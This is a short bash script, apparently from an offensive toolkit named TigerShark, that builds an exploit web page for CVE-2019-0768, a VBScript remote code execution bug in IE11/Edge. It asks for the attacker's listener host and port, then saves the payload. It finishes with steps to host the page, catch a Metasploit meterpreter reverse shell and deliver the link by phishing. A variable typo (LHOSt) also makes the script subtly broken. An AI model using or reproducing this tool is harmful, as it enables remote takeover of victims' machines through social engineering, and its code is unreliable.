#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
RED='\033[0;31m'
LBBLUE='\e[104m'

echo -e "${ORNG}"
figlet -f mini "Edge 11 vb RCE"
echo "index.html Gateway Page"
echo -e "${RED}CVE-2019-0768${NC}"
cd tools/ie11_vbscript_exploit
echo -e "${W}Please enter the LHOST used for metasploit meterpreter listener${NC}"
read LHOST
echo -e "${W}Please enter the LPORT used for metasploit meterpreter listener${NC}"
read LPORT
python ie11_vbscript.py ${LHOSt} ${LPORT}
sleep 5
mv exploit.html -t /opt/TigerShark/Payloads
echo -e "${RED}Your payload has been saved to /opt/TigerShark/Payloads/exploit.html"
echo -e "${LP}Usage: 1. Host the html file on your server"
echo -e "2. Setup a handler with windows/meterpreter/reverse_tcp in Metasploit"
echo -e "3. In your handler, set AutoRunScript with 'post/windows/manage/migrate'"
echo -e "4. Perform social engineering attack with the payload url(eg. gophish landing page)${NC}"
cd ../..
./tigershark